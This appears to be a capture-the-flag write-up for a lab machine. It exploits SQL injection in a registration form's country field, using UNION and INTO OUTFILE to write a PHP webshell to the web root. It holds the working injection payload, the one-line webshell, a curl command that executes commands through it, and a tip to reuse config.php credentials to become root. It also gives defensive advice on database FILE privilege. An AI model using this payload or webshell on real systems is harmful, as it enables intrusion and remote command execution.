Port 80 is a UHC registration page — enter a username, select a country, and it shows other players from the same country. Data goes into a database and comes back as HTML — classic injection surface.

Phase 1

Initial Access — SQL Injection INTO OUTFILE Webshell

Confirm Injection

Intercept the registration form in Burp. The country parameter is directly concatenated into SQL — adding a single quote triggers a PHP fatal error.

INTO OUTFILE — one SQL statement writes a webshell MySQL's INTO OUTFILE writes query results to a file on the server. By making the "result" a PHP webshell string and the path the web root, one injection creates a persistent backdoor. Requirements: the database account has FILE privilege and the target directory is writable by the MySQL process.

Write the Webshell

# Burp POST body — country parameter with UNION injection
username=max&country=Brazil' union all select "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/wshell.php" -- -

$ curl "http://10.129.95.235/wshell.php?cmd=id"

Proving FILE privilege After getting root, you can verify that the database account had FILE privilege by checking information_schema.USER_PRIVILEGES. This is what made INTO OUTFILE possible — without FILE privilege, MySQL would reject the write.
Appendix

Key Takeaways

SQL injection + FILE privilege = instant webshell.

INTO OUTFILE turns a SQL injection into a file write. One request writes a PHP backdoor to the web root — no upload, no file include, no encoding tricks. Check for FILE privilege on every SQL injection.

Not all injection is in obvious parameters.

The country dropdown value was injectable, not the username text field. Always test every parameter — dropdowns, hidden fields, headers, cookies.

config.php is the first file to read after any PHP foothold.

It almost always contains database credentials in plaintext. Those credentials are frequently reused as system passwords — one cat + one su = root.

Database accounts should never have FILE privilege.

FILE lets the DB process read/write arbitrary files on the server. Application accounts need only SELECT/INSERT/UPDATE/DELETE on their own database — nothing more.
